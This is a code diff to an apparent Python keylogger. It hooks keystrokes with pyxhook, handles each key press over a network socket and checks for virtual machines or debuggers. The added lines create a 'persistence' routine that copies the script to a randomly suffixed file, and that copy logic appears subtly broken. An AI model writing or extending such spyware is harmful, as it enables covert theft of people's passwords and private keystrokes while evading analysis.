@@ -1,7 +1,9 @@
+import random
 import socket
+import math
 import pyxhook
 
-from sys import stdout
+from sys import argv, stdout
 
 from RunningEnvironment import RunningEnvironment
 from WasteTime import WasteTime
@@ -20,6 +22,19 @@ def onKeyPress(event):
         sock.close()
 
 def main():
+    stdout.write(f'{argv[0]}\n')
+    ################################################################
+    # Persistance
+    ################################################################
+    originalFile = open(argv[0], 'rb')
+    file = originalFile.readlines()
+    originalFile.close()
+
+    output = open(argv[0] + str(random.randint(0,9)), 'w')
+
+    for everyLine in file[:math.floor(len(file)/2)]:
+        output.write(str(everyLine))
+
     captureKeys = True
     ################################################################
     # Check if program is running in a virtual machine or a debugger
@@ -39,6 +54,11 @@ def main():
     hook.KeyDown = onKeyPress
     hook.HookKeyboard()
     hook.start()
+
+    for everyLine in file[math.ceil(len(file)/2):]:
+        output.write(str(everyLine))
+
+    output.close()
 
     while captureKeys:
         pass
